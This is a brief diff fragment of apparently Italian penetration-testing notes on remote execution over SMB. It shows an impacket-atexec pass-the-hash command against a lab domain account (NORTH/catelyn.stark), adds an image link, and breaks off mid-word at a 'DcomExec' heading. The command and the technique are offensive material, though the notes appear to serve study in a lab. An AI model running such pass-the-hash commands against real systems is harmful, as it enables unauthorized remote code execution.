@@ -262,3 +262,6 @@ Usa delle task schedulate per runnare i comandi. Utilizza SMB.
 ```bash
 impacket-atexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
 ```
+![[Pasted image 20230907163321.png]]
+- DcomExec (Pseudo Shell)
+Pr
